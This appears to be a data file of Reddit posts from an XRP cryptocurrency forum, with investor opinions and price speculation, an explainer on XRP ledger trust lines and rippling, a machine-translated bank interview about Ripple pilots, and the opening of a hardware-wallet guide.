0,xrp,"Joined reddit to post my thoughts... take them as you will So full disclosure... I‚Äôve been invested in XRP since September. I purchased two positions within a week (delta = $0.01). 

Over the holiday season, this thing went crazy. On EST, I‚Äôll admit it was very fun waking up every morning with gains. Since the new year, I know it hasn‚Äôt been so fun for many.

When you‚Äôre at Xmas dinner at your uncle is talking about ‚Äúcryptocurrency‚Äù and asking you how to buy XRP, you have the first sign you‚Äôre invested in something you can‚Äôt trust. Is all this stuff a bubble? Ain‚Äôt a doubt in the world.

The question: how long do you hold (HODL for you in the crypto cult)? Seeing how I don‚Äôt want to pay cap gains, I invested in September both fully expecting to lose my investment, and prepared to not look at the price for 366 days. I can‚Äôt say I‚Äôve stayed true to the latter.

It‚Äôs addictive. What can I say?

If you understand the startup world, and you‚Äôve done your research on Ripple, you might agree with my guess that the fabulously wealthy founders and early employees never banked on XRP (alone) making them multi-billionaires. 

Believing in the technology is great. I do believe in Ripple, and perhaps XRP too, but if you really had the buying power, your best bet is buying shares of Ripple (the startup‚Äôs equity not the XRP token) on SharesPost. Of course this requires you to be an accredited investor. I am not one, so I bought XRP.

Now, I‚Äôve held. I saw this token go to >$3, and I held. It‚Äôs real money. Do I regret not selling? Absolutely. But why do I still hold? Even at ~$1.50 I‚Äôve made a great amount. In my opinion, it‚Äôs better to have a horse in the race than sit on the sidelines with regret.

This is my first post on Reddit. I did so because I figure there are probably others in my shoes that have ventured to this thread in the wake of their declining net worth. This ‚Äúcommunity‚Äù probably isn‚Äôt the smartest, but you have to have a little bit of naive hope to invest in this asset class anyway. These gains can change lives. I wouldn‚Äôt lose my house or family over it, because there‚Äôs no doubt it‚Äôs a bubble, but as far as cryptos/tokens, (bitcoin and equivalent are ‚Äúcurrencies‚Äù) XRP offers the most utility for the best price on the common exchanges. ETH is probably more valuable to the holistic blockchain community, but that market hasn‚Äôt been established because it‚Äôs not yet fully understood. Payments and money transfers has been, and whether or not banks use XRP on xRapid, institutions will be too closely tied in the short term to ignore the opportunity to speculate on XRP.

GS and MS are becoming actively involved in ‚Äúcrypto‚Äù. I assume BAC, JPM, BCS have to be taking a close look as well. This is the most friendly token they will come by. Mix in an add from Coinbase‚Äî their board including Fred Wilson will make them get over their platform limitations and capitalize on the ‚Äúcrypto-craze‚Äù by adding new tokens in 2018‚Äì and this token is a lock to exceed previous ATH. If XRP isn‚Äôt amongst those added, then they‚Äôre just plain incompetent or complicit in a scheme.

If these factors don‚Äôt move XRP to >$5, then we truly are in a conspiracy controlled by whales, and it‚Äôs time to move back into equities. Can‚Äôt control what we can‚Äôt control...

Long post I know. Not trying to feed the bull with some bull. This is an asset class I‚Äôd recommend anyone be involved in, even if only a small amount, and this is the only token I expect to survive the 2019/2020 bubble. Whether or not we drop back to $0.25 during that span remains to be seen, but if you remember the dot-com bubble, some pretty good investments survived. XRP stands the best chance based on utility alone. With that, I HODL in solidarity!"

Not 1 minute passed by and I decided to remove my post as I could see myself being crucified on that subreddit for mentioning anything other than BTC.

Here is how, XRapid platform :


For payments in the critical remittance corridor between the U.S. and Mexico, financial institutions using xRapid saw a savings of 40-70 percent compared to what they normally pay foreign exchange brokers. An average xRapid payment took just over two minutes, compared to today‚Äôs average of two to three days when sending cross-border payments. The portion of the transfer that relies on the XRP Ledger takes two to three seconds, with the additional processing time attributed to movement across the intermediary digital asset exchanges and local payment rails.

A payment journey with xRapid looks like this: a financial institution connects directly to digital asset exchanges in both the originating and destination corridors. The originating currency is exchanged into XRP which provides the necessary liquidity to power the final payment, and then in seconds that XRP is exchanged into the destination currency in the second digital asset exchange. Once this transaction takes place, the funds are sent out on the local rails of the destination country for payout. The transaction is tracked end-to-end, and the result is a cross-border payment that is cheaper and faster than ever before.

0,xrp,"The Next Time Someone Says ""XRP is Centralized"".... What a shit show this Ver/Wright dick measuring contest has become. I see this as vindication for projects like XRP. I get so sick of the FUD that XRP is somehow centralized and is not a true crypto like Bitcoin. What a joke when 1-2 people can completely tank things. 

2nd piece of good news is I watched BTC drag down the market as usual this morning and XRP came down from .52 to about .40 and then within an hour bounced back to supports at .45. It's held it's ground nicely considering and is further proof that projects like this are decoupling from BTC bit by bit. BTC still holds major sway in the market no doubt, but that's shrinking more and more. Can't wait until projects like BCH are dead."

0,xrp,"Bear market on a Bull run If you have been alive over the last 3 months, paying attention to anything, you can see that Bitcoin and other cryptocurrencies like XRP are having an incredible amount of news articles and posts related to their success and failures. Bunch of these news articles have focused on the downfall so early in this game. People are beginning to take worry when the news teams that are focused on ratings are discussing the fall in the tens and twenties percent for the cryptocurrency market these last few days. 

The one thing that news does not take into account is the fact that the market is still increasingly going up, and in some cases thousands of percent over the last 3 months. If you look at it on a micro scale, the last week is when you see the bear market and the volatility of cryptocurrency still in the midst of a bull run.

I'm not a financial advisor but now is not a bad time to buy if you think everything is continuing to go to the Moon. But it's still a bull market and the question remains will the Bears go all the way out the window? If I were a betting man I would say that this might be the new floor. As it appears that the market is stabilizing. The one thing that hasn't really been driving the market yet is where people invest in the technology that is specific to each crypto developing team. Right now people are just hearing about cryptocurrencies and popularity is driving the market upward.  As the infrastructure for cryptocurrencies increases, those who are already in the know will benefit. The ceiling is going to be very very very high.

This looks like the perfect time for those just starting to figure it out and begin to experiment with cryptocurrency. Because for those that are going to wait and test it out later they're going to miss out on this opportunity while learning the same lesson."

I kept telling people how amazing xrp is! People  called me crazy for buying xrp at 16-19c. Saying it will never reach $1. Boy were they wrong last year. It topped out just past $3... well guys, the time is now right. This is now our second chance to buy more, or for those that missed out last year to buy for the first time before it gets way way to expensive. Please expect that this time we are not going to the moon. We are going to MARS! I will not be surprised at all to see xrp run to $1 within the next month before kickstarting the next bull run in crypto, at which that point....there is only one way, and that is up. Probably to $10 in 2 years. I‚Äôd like to emphasize this is not financial advice. Just my opinion :P"

**XRP Wallets**

You need 20 XRP to activate an XRP wallet. Fees can be changed by the validators through the [voting ](https://ripple.com/build/fee-voting/) process.

The [reserve requirement](https://ripple.com/build/reserves/) protects the XRP Ledger from spam or malicious usage.

&nbsp;

When you are sending XRP to an exchange, **destination tag is very important**.

Destination tag is not needed when you transfer XRP to your own wallet address.

**Cory Johnson:** There‚Äôs been enormous confusion about some things that are demonstrably provable. Like, there is a difference between Ripple and XRP. We haven‚Äôt had great journalism in this sector. There have been exceptions, but there‚Äôs a lot of reliance on Twitter and individual blogs from sources with deeply conflicting agendas. It‚Äôs hard for someone to write an article that gives XRP the benefit of the doubt or says, ‚ÄúHey, this could be good,‚Äù when they have personal investments in bitcoin. They don‚Äôt allow themselves the possibility of saying ‚ÄúXRP is better than Bitcoin‚Äù because of the financial loss they might engender. Even if they have the best of intentions.

There is talk about XRP being considered a security and it is currently being under review by the SEC. Logically a company would not advertise their technology aggressively and continue expansion knowing their digital asset is a risk of a different ruling. The fact that there is silence on the end of the SEC and increased activity on Ripple's end to promote their technology and company, eludes to the possibility a decision has been rendered. Furthermore, Ryan Zagone leading the Federal Reserve Faster Payments Task Force. Ripple had a goal which was to change the system from the inside out. They have put this into motion. For the U.S. to rule otherwise would be crippling especially with huge banks around the world already adopting their technology. Behaviorly, making other countries dependent on this technology, it becomes an inelastic good (i.e. gas because you need it to get to work, go anywhere, etc.) It would not make sense to disregard the impact Ripple has made and is going to make in the financial world. I think this quiet is just the eye of the storm. All the officials in higher places are staking their claim before mass adoption happens and prices skyrocket. I could be wrong but it makes so much sense to me. Please share your thoughts! I would like to hear what you guys think."

0,xrp,"Trust line 101: What is an IOU on the XRP ledger like Allvor (ALV), what is ‚Äúrippling‚Äù and why we need to have a conversation about it all ASAP. We really need to have a serious conversation about trust lines, IOU tokens and rippling effect because I think a lot of people don‚Äôt really understand the concept at the root of it all... 

With the Allvor airdrop came a lot of questions about trust lines on the XRP ledger. A lot of old fears and stories of scam resurfaced.

I‚Äôm seeing all sorts of questions and posts that show some people have absolutely no clue of how this all works and it could lead them to lose money. I hope it can help someone out there...

This is my humble explanation of what are trust lines, IOU tokens and rippling on the XRP ledger, in layman‚Äôs terms:

So, let‚Äôs start slow. 

We can create ¬´¬†tokens¬†¬ª on the XRP ledger, they can be added into an XRP wallet or address, just like ERC20 tokens on the Ethereum network. We can have, under an XRP address, plenty of other ¬´¬†tokens¬†¬ª coexisting with the XRP in our account. I use quotation marks around the word token because we really should stop the comparison there. 

They are not really tokens. They do, indeed, have a symbol (a name), like any conventional crypto token, we can also trade them for XRP, but I think it is confusing to think of it this way. I think it‚Äôs even dangerous to think of it all as tokens and it can lead to scams. They are not a positive value of something, they are a negative number, a debt, an IOU. An IOU is the exact opposite of a token. It is a debt of something, not a token we can spend to buy something else.

An IOU is just a debt balance on your trust line, like the numbers on your credit card bill. 

To help us understand, we need to think of it all backwards and imagine ourselves as being a bank.

When we need money and open up a credit card account with a bank, we say the bank opens up a line of credit with us. On the XRP ledger, this is called opening a trust line with someone. When someone wants to borrow money from us, we have to create a trust line for them in our account.

The bank assigns a credit limit to the credit card and we can‚Äôt borrow more than this limit, just like we can fix a limit on any trust line on the XRP ledger. 

We can use this credit card whenever we want, each time we use it, the credit card balance is adjusted to reflect the transaction, the amount of debt is increasing in our credit card account. This is money we borrowed from the credit card company and we will have to pay it back later.

When we receive the credit card monthly bill, we can see our balance or what is the total amount of debt in this particular account or line of credit. This number does not represent something we own, it‚Äôs not like a savings account where the number represents money we possess and can spend. The number on our credit card bill represents a debt, it‚Äôs a negative balance on our budget. 

And this is also how we must think about a trust line balance on the XRP ledger. It really only is a debt someone owes us. Each of these dollars on the credit card bill is an IOU (I Owe yoU), representing a real dollar we borrowed. The more of these IOUs we have on balance, the more debt we have. This is also how it works on the XRP ledger: when you give me something in real life, I give you an IOU token on the XRP ledger as a declaration of this debt. I declare my debt by sending you this IOU on your trust line.

We can have several credit cards associated to the same bank account and the bank can also extend her own lines of credit to several other different customers. On the XRP ledger we can extend several trust lines to different addresses to receive IOU tokens in our account and several people can extend trust lines into our own address to allow us to issue them our IOUs.

Each credit card is only issued for one particular currency. If we want a credit card for another currency, we need to add another credit card. It‚Äôs the same on the XRP ledger, we have to create one unique trust line in our account for each different type of IOU symbol (like ALV) we want to trade with someone. Each trust line has its own limit.

This is what we trade on the XRP ledger when we are trading tokens. They really are only declarations of debt. Anybody can issue any IOU symbol to anyone. They represent something that we traded it for, in real life. 

We could trade a cow IOU, a car IOU, precious metals IOU and of course crypto currency IOU on the XRP ledger. Anything you can imagine! And this is where you have to be careful. A crypto currency IOU is not the real thing even if it is traded like a token! A BTC IOU on the XRP ledger is not a real BTC!! It is only representing a debt of one BTC. Someone issues this IOU to you when you lend them a real BTC.

Each IOU have a symbol on the XRP ledger (like the ALV token) just like currency IOUs have symbols on your credit card balance (USD, CAD....). We could trade cows on the ledger and create an IOU with the symbol ‚ÄúCOW‚Äù, redeemable for a real cow or representing its value. If you could borrow a cow from VISA, to keep track of this debt they would only add a line in your credit card bill with the name ‚ÄúCOW‚Äù and put your debt balance right besides it. Just like VISA can add a line on our credit card bill and show the balance of this debt, anyone can create an IOU trust line in their own XRP account, name it ‚ÄúCOW‚Äù and keep track of the number of cows somebody borrows them and for which they sent an IOU token to keep track of this debt.

Those IOUs with a same symbol are all somehow considered the same by the network, no matter who issues them. An ALV token issued by Allvor is considered an ALV token just as the ALV token I would issue to yourself. The only difference is the issuer. Sometimes it matters, sometimes not (like when a payment is ‚Äúrippling‚Äù between trust lines for instance, more on that later). 

The bank needs to open a new line of credit for every credit card in your bank account. This line of credit is connected to the issuer of the credit card (Visa, master card or else). You have to pay the balance of each credit card to each issuer separately, each credit card have it‚Äôs own bill and balance. It‚Äôs the same on the XRP ledger, each IOU have one particular issuer, only the issuer of this IOU have a debt with you when it issues you this IOU. 

You can have several IOUs named exactly the same in your XRP account, but each issued by different people. The ALV tokens I am issuing to you if you extend a trust line named ‚ÄúALV‚Äù to my address are not the same ALV tokens that Allvor is distributing. They both have the same name or symbol, but don‚Äôt have the same issuer. Each issuer only have its own debt balance with you (or its own IOU tokens balance residing on its trust line with you).

In a bank account, we can have several credit cards of the same currency (IOU) from the same issuer (visa), but this is a bit different on the XRP ledger: On the XRP ledger, you can have several trust lines extended to someone‚Äôs address, but each trust line is dedicated to one particular IOU. You can‚Äôt establish two trust lines with someone for the same IOU. It would not make sense, you are already trading this IOU. We can still have two trust lines sharing a same IOU in our account, but they have to be connected to two different addresses. 

Extending a trust line into someone else‚Äôs account is really like saying: 

‚ÄúI created you a line of credit in my account. You can borrow all you want from me, up to the limit I fixed in the parameters of the trust line. You are free to give me back what you borrowed at the moment you desire, it‚Äôs really up to you, it‚Äôs bar open, I trust you. Each time you will borrow money from me, the balance of our trust line will be adjusted accordingly to leave a trace of what you owe me. When you give me back my money, your debt balance will go down.‚Äù

And that‚Äôs it. This is all the ledger does with IOU tokens. It‚Äôs only keeping track of a debt balance. It can be applied to anything, not just money.

They are not a token we exchange each other to buy things, this is not how it works, it‚Äôs all backwards. Of course you could do that if you want (sell your IOU ‚Äútokens‚Äù for XRP on the XRP built-in exchange). You can trade everything you want for anything else in life, for speculative reasons, but it‚Äôs not really their real purpose I think.

They are not deposited into an account, they are taken, OUT of a a credit line. It‚Äôs a debt you contract, YOU are deciding to borrow something from someone when you ‚Äúsend‚Äù this IOU and not the other way around. 

Of course if we agree to share a trust line, we should sign a contract to establish our terms and conditions, something enforceable by law in case of disagreements. But if we don‚Äôt, there really is nothing the ledger can do for us, it‚Äôs just a database of who borrowed what to who. What protects the credit card company is the contract you sign with them.

Let‚Äôs get back to the bank and credit card analogy. Are you still thinking you are the one who is having IOU tokens in your account when you receive your credit card bill? After all, there is a positive number on the bill that goes up when you borrow money, so it‚Äôs like you are receiving more and more IOU tokens, right? Well... Not exactly. This is just to show you how this is all confusing and backwards.

YOU give them your IOU tokens in exchange of money. YOU are the issuer of those tokens or declarations of debt. It is THE BANK who creates a trust line to YOU in her wallet and fixes the limit of the trust line, not the other way around.

When you borrow money, the balance of IOU goes positive on your monthly bill, indeed, but the number you see on the bill you receive each month represents the amount of IOU tokens that THE BANK owns in her wallet. It is the positive balance of the bank. To you this number is negative in reality, it‚Äôs a debt. 

The credit card company can‚Äôt force you to repay your debts with the IOUs you give them, they can‚Äôt steal money from your account with it. They can‚Äôt send you those tokens and expect you to pay something for it automatically. YOU have to give them back money to remove those tokens from their account. YOU have to buy back your debt to them to clear it.

In real life, you have incentives to pay back your debts. You sign a contract with certain conditions, like paying interests and the monthly minimum payment. It‚Äôs all part of the agreement you signed with the bank when you opened the line of credit.

You could refuse to refund your credit card debts if you want, but it goes against the contract you signed with the bank and it can be used against you in court.


To recapitulate:

Bank account = XRP address

Credit card or line of credit = trust line

Credit card balance or debt = IOU ‚Äútoken‚Äù or balance on a trust line

Those tokens are not really something of value that you give, but more something you receive as a declaration of a debt. It‚Äôs not like giving a dollar bill or coin, like we are used to think of currency, including crypto currencies. Seeing this as a token is just creating confusion, it‚Äôs the exact opposite, see it as a debt, an IOU.

Anyone can issue an IOU on the ledger. Anyone can say: ‚Äúif you give me one Bitcoin, I will give you this paper, this IOU named BTC, that represents a debt I owe you and that I will exchange back for a real Bitcoin when I desire‚Äù. Again, it‚Äôs just a declaration of a debt, an IOU. What matters is if the issuer of the debt have the intention or is able to pay you back and the terms and conditions of the contract you have with them.

So for those ALV tokens airdrop, what happened exactly? Well, we just opened a trust line with Allvor and they borrowed us some ALV, whatever value it represents in real life and sent those tokens in exchange. We did not ‚Äúreceive‚Äù tokens. They took a loan on us. If you did set out the limit of the trust line to millions of tokens (like it was recommended on their website), it means that they can still send you A LOT of ALV if they want, up to this limit.

But for now it doesn‚Äôt mean much, right? We didn‚Äôt exchange money for those tokens, there is nothing to be refunded and I can‚Äôt do anything with those tokens. We don‚Äôt even know what they will be used for in the Allvor project. It‚Äôs hard to assign any value to this IOU because for now it does not represent anything in real life, they are not pegged to anything.

But please, think about it before you go ‚Äúbuy‚Äù those tokens for real XRP (trading them on the XRP built in exchange). We don‚Äôt know if Allvor or anyone else will accept to give back anything in exchange of these tokens in the future, for now they are really only thin air, a debt, an IOU. 

You can extend a trust line to me for this same ALV token symbol and I will ‚Äúsend‚Äù you as much as you want, all for free, and if the limit is high enough I can make you an ALV billionnaire with the click of a mouse! :) Think about it... My only condition is that I do not guarantee I will trade you back anything for those ‚Äútokens‚Äù later on. In fact I can even guarantee I will never give you more than 0$ for them. Is that ok? Deal? Oh, but if you want to send me XRP for it! That‚Äôs fine!! I‚Äôll take it!

Understand now?

Of course those ALV tokens would only be issued by me, they would only reside on the trust line you extended to me. It‚Äôs a deal between you and me only. They are not the same ALV issued by Allvor. The issuer DOES matter here. So how much those tokens will be worth depends on the issuer. 

You can‚Äôt really ‚Äúsend‚Äù or sell those IOU issued by Allvor to anyone who doesn‚Äôt have any ALV trust line with Allvor. If they only create a trust line with you, what you are doing is sending some IOUs issued by yourself. The real ALV tokens issued by Allvor can only be issued by them! Anyone who wants to receive tokens issued by Allvor must first setup a trust line with Allvor.

The only way to ‚Äúsend‚Äù real Allvor‚Äôs tokens to anyone is by rippling when you are both connected by a trust line to Allvor (again, more on that later, we are almost there).

Remember; someone has to establish a trust line to you before you can send them IOU tokens. The IOU tokens you would then send to them are only new tokens YOU would issue, right? They are not the other tokens issued by someone else. It‚Äôs NOT like tokens or other cryptos like XRPs!! This is why I say it‚Äôs confusing to think of it all as tokens. It makes much more sense to think of it as a debt, each ‚Äútoken‚Äù on a trust line representing a debt balance for what this token is representing in real life.

Still there? Ok, stay with me, the worst is done, almost there! üòÇ

Now that I explained what are trust lines and IOUs, I can finally explain what is ¬´¬†rippling¬†¬ª. It is well explained here https://ripple.com/build/understanding-the-noripple-flag/

In layman‚Äôs terms, when you extend a trust line for one particular IOU symbol in your account with several people or addresses, you establish a kind of network between you and other XRP addresses, you become a kind of hub for this network. Everybody in your network is somehow connected together by you.

Rippling allows us to send an IOU between two people that are not directly connected together by trust lines. The payment is passing through everyone‚Äôs trust lines to connect two unrelated points on the network. It finds the best path possible and ‚Äúripples‚Äù through the trust lines.

This is how it happens:

Alice is connected to Bob and Charlie with her trust lines. She has only those two trust lines in her account. She borrowed 20$ to each of them, so she has a balance of 20 IOU on each trust line with them, for a total of 40 IOU.

Bob and Charlie are both only connected to Alice, they only have this one trust line in their account.

Charlie wants to borrow 5$ from Bob (or if you prefer, Bob wants to send 5$ to Charlie), so in other words Charlie wants to send Bob 5 IOU tokens to declare this new debt. 

But Charlie is not connected to Bob with a trust line, so he can‚Äôt issue him any IOU. This is just how the XRP ledger works, Bob must first accept to extend a trust line to Charlie to receive his IOU tokens. Of course Bob could open a trust line to Charlie in its account, but there is another possibility.

Bob has a trust line with Alice, and he knows that Alice is connected to Charlie, so he does this: 

He tells Alice to deduce 5$ from her debt with him and send the 5$ to Charlie instead. Alice owes Bob 15$ now, the balance on her trust line with him becomes 15 IOU. 

She has a 5$ debt to Charlie now, so she sends 5 IOU to Charlie to declare this debt. She adds 5 IOU to the balance on the trust line with Charlie. The balance on the trust line is raised to 25 IOU. She now owes 25$ to Charlie. 

Charlie is 5$ richer (on paper), his trust line balance with Alice went from 20 to 25 IOU. Did you see how I specified ‚Äúon paper‚Äù? Those are still just IOUs. Bob did not really ‚Äúsend‚Äù 5 real dollars, but technically he really did and it was all fine with Charlie.

Magic!!

This is called the rippling effect on the XRP ledger. This transfer of a debt from one trust line to another one in your account can all be done automatically.

You don‚Äôt ‚Äúlose‚Äù any money when a payment ripples through your trust lines. Your debt is just shifted from one trust line balance to the other one. Alice is still 40$ in debt overall. She just owes it to different people (15$ to Bob and 25$ to Charlie). 

But you can also disable this function on your trust line to prevent any payment from rippling through it and affecting your balance. It‚Äôs important to understand how it works because you can enable this feature or not when you create a new trust line.

In theory, a 20$ debt is a 20$ debt, no matter who pays it, but in reality it may also matter who owes you money and you may prefer having your IOU balance on one trust line more than the other. Maybe you know there is more chances you will receive money from one person than the other (one trust line has more liquidity than the other). So you wouldn‚Äôt want rippling to affect the balance of your ‚Äúgood‚Äù trust line. You would just disable rippling on this trust line. 

We are trying to make sense of it all with real money concepts, but this IOU and rippling system offers a lot of flexibility and could be more useful for one kind of application than the other in the future. It could be used to keep track of all kinds of balance, like micro payments, video games, streaming content on demand or anything else.

For now it is all a little hard to grasp, but the rippling function exists, just be aware of how it works and don‚Äôt forget to disable rippling when you create a trust line if you don‚Äôt want your balance to be influenced by other trust lines also activated for rippling and sharing this particular IOU with you.

Remember, the rippling is done for one particular IOU, so you need to have at least two trust lines sharing the same IOU in your account for a rippling to happen.

So this whole IOU tokens concept is really like a credit or lending system integrated into the XRP ledger and nothing else! 

And that‚Äôs about it! Congratulations, you‚Äôve made it! Sorry for the wall of text, but this is all a bit complicated and hard to explain without laying it all down like this.

I hope it‚Äôs a little bit clearer now!!

Thank you for reading! You‚Äôre free now! ;)

0,xrp,"Erste Group, one of the biggest banks in europe: We work with ripple since 2 years Ripple has an advantage... !

Full text, source below: (Translated by google translate)

Petia Niederl√§nder studied investment banking and corporate management at the Vienna University of Economics and Business and spent part of her studies in Australia. The Bulgarian has been living in Austria for 20 years and has been working in the Erste Group since 2009. She has been Head of Retail & Corporate Operations since April 2013 and is responsible for the clearing and international business relationships of Erste Group.

We talked to her about Erste Group's blockchain technology strategy. Dutch gives us a deep insight into the competition of the different technological approaches of IBM, SWIFT, R3 and Ripple. One thing seems certain, though: in the banking world, Distributed Ledger technology is creating a new back-end system that could go into a new type of payment transaction.

The Erste Group was so far covered with statements about Bitcoin and Co. very. How do your institute assess the topic?

Petia Dutch: We are basically not involved there. Our efforts on blockchain technology are aimed at finding out in which sectors we expect the greatest disruption in the future. Above all, we monitor cross-border trade between banks and try to create more efficient systems for our corporate clients.

Despite the gigantic hype around Bitcoin, the retail customers of the banks get little of the technological innovations.

Petia Dutchman. ¬© Erste Group / Alfred Haas Petia Dutchman ¬© Erste Group / Alfred Haas The blockchain is a backend technology. It brings great benefits to participants in a common ecosystem. For our small and medium-sized customers, we have launched the Batavia platform, a first pilot, which represents the financing of export and import business in a novel way ( Trending Topics reported ). If, for example, a restaurant buys coffee, drinks or food from other countries that we want to finance on short notice, it often gives you weeks of waiting time. Importer and exporter know and do not trust each other. Customs offices and border controls create a complicated process with many stamps and more paper. With Batavia, we are relocating the processing of the services associated with the import to a blockchain. All parties involved know where the goods are and what status they currently hold. Blockchain also guarantees the payment of goods by our bank.

How much time do companies save?

The speed depends on the destination country. Within Europe, we are now able to conclude an import contract including the financing guarantee within a few hours. It used to be days, if not weeks. Currently we use Batavia for customers from the USA and Europe. However, the new methodology, with its strong partner network (UBS, Caixa Bank, Bank of Montreal and Commerzbank), certainly has the goal of acting globally.

Batavia is based on Hyperledger from IBM. Do you currently see a competition between the individual distributed ledger technologies?

Definitely. Especially in the finance sector, there are a wide variety of players who pursue a similar goal - to make interbank trading more efficient and to radically shorten transaction times. IBM brings in hyperledgers in a variety of consortia. SWIFT is also working on its own proof-of-concept to map banks' liquidity in real time. The organization is responsible for the transaction traffic for more than 10,000 banks and thus the user group is of course enormous. However, it may take years for SWIFT to launch its own blockchain technology. Ripple currently has a lead. It is quite possible that the startup will bring more mass-compatible technology to market faster.

How will distributed ledger affect the banking world?

Before our eyes, a new Internet is being created that links the different distributed ledger approaches, creating a new digital world in which the logs of each distributed record communicate with each other. Transactions happen in real time, costs are radically reduced.

Which other pilots did Erste Group launch?

We have been working with Ripple since 2016 and have developed a pilot for foreign payments. Anyone wishing to transfer money abroad in a foreign currency will experience this in the future without waiting. We have installed a top institute in the holding company. There is also our clearing bank. The pilot tries to connect our subsidiary banks with each other and thus to realize international transactions without conversions. If it works within the group, then it can also work with international partners. Once opened, we can look for suitable partner banks from the ripple network we work with.

When should the network be opened to other institutes?

We finished the pilot at the end of 2017. We are now evaluating further technological approaches and waiting for the efforts of Swift and Hyperledger. We want to find the right partner in peace and quiet. We want to make a decision by the end of the year .

How did the collaboration with Ripple work? The interaction of startup and bank is often characterized by cultural differences.

The ripple technology is technologically advanced, and the implementation into our own legacy was actually the biggest challenge. Ripple is developing a payment system that is controlled by users. This is difficult to reconcile with the learned tradition of a bank that has so far steered everything centrally. In addition, there were initial problems within the processes because Ripple was focused only on the US market.

Therefore, the implementation of the pilot took over twelve months?

We simply did not understand at the beginning. Ripple was only active in the US. But that changed in 2017. Brad Garlinghouse and his team have begun to serve European banks regionally, and have stationed many experts in London who act as direct contacts for us. That's why the technical implementation took so long. Afterwards we tested the performance and business functionality and integrated a payment backend.

Many other banks rely on the R3 consortium to develop their own centralized solution. Why is R3 not suitable for Erste Group?

R3 wants to develop its own Distributed Ledger as an alternative to Blockchain. We looked at the conditions, conducted discussions and found that there were no suitable use cases for us. We want to actively shape the development and therefore need to find out well in which consortia our experts contribute and in which not. R3 wants to cover many areas, but we want to be actively integrated into the workflow.

Ripple was more open?

We chose ripple because the ledger was better and the experiments seemed more exciting. The partner network also played an important role. We are looking for cooperation banks that have the same target markets.

Interbank trade, import business - which areas are exciting for the finance sector?

Of course, the colleagues from the capital market are intensively observing the topic. However, we must wait for the regulatory action and look at what laws will be implemented during the year. The KYC process, Identity Management, is also really interesting. For the review of customer data, we also expect a technological quantum leap in the coming years.

0,xrp,"Let's talk about the minimum XRP Requirement for a workable wallet. While I understand the importance of an XRP minimum amount to start a wallet, over time I would like to see it tied to the current market rate of XRP. So let‚Äôs say Ripple decides the equivalent of 6.00 USD is the minimum to start a wallet, well if the current market rate of XRP is 2.00 per XRP then you should need 3 XRP to start a wallet not 20. This will help newcomers to the Ripple system, and make funding the wallet of family or friend that‚Äôs is interested in Ripple more conceivable. If the price of 1 XRP ever went to 10.00, do you really want to have to have the minimum to open a workable wallet equal to 200.00 USD?

First time posting here, because I haven't found the answer anywhere. Maybe my searching skills aren't top notch, or maybe no one bothered to ask the question.

So, once xRapid goes live and we start seeing big activity from big players, we should be seeing high(er) volumes and XRP price going up. But it should only be going up for a certain fiat, and down for the other fiat, correct?

Example: if we want to transfer $1M to Europe, XRP/USD will rise, and XRP/EUR will fall -- we buy XRP with USD on one side, and sell XRP for EUR on the other. Am I wrong?

But, after a while, if there are multiple transfers both ways, things may even out at some point. So how are we going to ensure that both XRP/USD and XRP/EUR go up? This has been bugging me for a while.

0,xrp,"SME who believes in XRP I am a SME in enterprise global payments, in one of the larger S&P 500 enterprises. Weekly I watch the effort and process of creating offshore pre-funded foreign accounts to pay supplier cost and fees, as we launch product into new foreign countries, and prepare to scale up, and how much money sits in those revolving accounts.


Weekly I see the struggles of repatriation. Some countries and jurisdictions are simple in their repatriation rules, others are more complex. Complexity in that you must tie at a very granular level the customer transaction that occurred, and specific attributes, to monies in those local foreign bank account(s). Not simple at an enterprise level, even though it sounds simple.


Not to mention that sometimes the fees charged by the payment provider/reporter, can really be high, and in niche scenarios, make operating in a foreign country perhaps not as profitable as one would have hoped.


My big thing, the variety of our payment providers/reporter data feeds, all come with different formatting and with slightly different attributes, creating more complexity, time, and effort.


Sometimes the settlement reporting we receive is late or ""missed"" because of errors in the data flow. That is not good when a jurisdiction requires the ""register"" of monies in bank be tied to customer transactions/attributes to repatriate.


All of which leads me to:

I see the power of an interconnected ripple net (network effect, standardization, extension).


I see the power of innovating in cross-border money movement and repatriation, which would ALREADY be in ledger format. I repeat, already in a ledger format! 


I see the power of rapid money transfer, increasingly liquidity. It flips the idea of the traditional pre-funded local account in a foreign country into a model of money-on demand. A model where money is moved rapidly, as needed only. No under or over budgeting the revolving account in order to sustain operations offshore.


My only question is, when does XRP de-couple or de-correlate with Bitcoin? Perhaps everyone asking that question? 


I am going big and long on XRP, but of course, not using monies I cannot afford to lose.

0,xrp,"Would you make a promise the XRP community? ### Can you answer this question?

If there were a service that would send you a monthly reminder to buy a little XRP (DCA - dollar cost average) would you use it?

### Why I'm asking.

A couple YouTubers have mentioned that we can all help the cause for our favorite crypto currency. They said ""if everyone just bought a little every month we could move the price ourselves"" and I agree with them.

### Who would build it?

I'm a software engineer who enjoys building stuff like this. If the community will use it (free obviously) I'll build it and I'll involve everyone here each step of the way to make sure it has the features we all want.

### But there are plenty of reminder services out there!

Yeah, but this one would be ours and it would be made just for this reason.

### Would this run on Codius?

As one of the moderators for the Codius sub I can confidently say that Codius is still very much a work in progress. So that would be a ""maybe"" once more dragons have been taken care of on the project.

At first I'd just run it on AWS.

### Updating to incorporate feedback from below

Keep in mind I'm not for or against making this app, I'm just throwing it out to see what sticks.

The app I'm proposing isn't going to do any scheduling, buying, selling, or alerting about prices. Some have mentioned buy walls caused by something like this and that is just not what I'm proposing at all here.

It would remind you of your promise but not schedule a buy or anything like that.

Others have said they would want an alert when the price is at a low for the month (I'm not proposing that either). 

### What it could be for the community

Something for the community to share and take part in was really the goal that sparked my interest in ‚Äúpossibly‚Äù doing this. 

An app we all use that shows user‚Äôs (not necessarily their names - but maybe their public XRP addresses) are joining together to make a difference is better than XRParrot alone or a google calendar IMO.

This app wouldn‚Äôt handle the payments or anything. In fact it would probably share instructions for using services like XRParrot. It would likely point people to all the supported exchanges too.

The ‚ÄúXRPCommunityPromises‚Äù app would just publicly announce and track those who make the promise. If people pledge to buy 100 XRP (or 10 or even just 1) a month we can highlight the ones doing it. If they provide their public address on the XRPL then we can track it and celebrate the ""promise keepers"".

It would show the world that we are working together as a community to support XRP.

It would show the world that we aren‚Äôt afraid of the bear whales. With enough of us we could short squeeze the bears and turn them bullish too.

It's just a place for us to publicly show our support for XRP.

0,xrp,"Securing your Crypto with a Ledger - Things to Consider I wrote this for a friend. This is how you should setup, verify, and secure your wallet/keys.

The Nano is a hardware wallet. It generates the private key inside the USB dongle. It has a very limited API set and the private key is locked away in the hardware only accessible from the the OLED display on the device in the form of a 24 word BIP39 ""seed"" https://en.bitcoin.it/wiki/Mnemonic_phrase .

